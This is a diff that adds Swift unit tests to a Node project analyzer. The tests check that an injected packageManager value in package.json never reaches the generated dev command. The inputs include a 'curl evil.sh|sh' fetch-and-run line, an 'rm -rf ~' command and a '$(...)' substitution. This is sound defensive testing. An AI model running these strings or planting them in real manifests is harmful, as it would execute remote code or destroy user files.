@@ -75,6 +75,10 @@ struct NodeAnalysisTests {
             ("yarn.lock", nil, "yarn", "yarn dev"),
             ("package-lock.json", nil, "npm", "npm run dev"),
             (nil, "pnpm@9.1.0", "pnpm", "pnpm run dev"),
+            (nil, "yarn@4.1.0", "yarn", "yarn dev"),
+            (nil, "npm; curl evil.sh|sh #@1", "npm", "npm run dev"),
+            ("pnpm-lock.yaml", "rm -rf ~ #@1", "pnpm", "pnpm run dev"),
+            (nil, "$(touch pwned)", "npm", "npm run dev"),
         ] as [(String?, String?, String, String)])
     func packageManager(lockfile: String?, declared: String?, manager: String, command: String) throws {
         let dir = try TemporaryDirectory()
@@ -88,6 +92,18 @@ struct NodeAnalysisTests {
 
         #expect(analysis.packageManager == manager)
         #expect(analysis.devCommand == command)
+    }
+
+    @Test func aHostilePackageManagerDeclarationNeverReachesTheDevCommand() throws {
+        let dir = try TemporaryDirectory()
+        try dir.write(#"{"name":"x","packageManager":"npm; curl evil.sh|sh #@1"}"#, to: "package.json")
+
+        let command = try #require(try ProjectAnalyzer().analyze(path: dir.path).devCommand)
+
+        #expect(!command.contains(";"))
+        #expect(!command.contains("|"))
+        #expect(!command.contains("$("))
+        #expect(command.split(separator: " ") == ["npm", "run", "dev"])
     }
 
     @Test func goModuleIsAGoProject() throws {
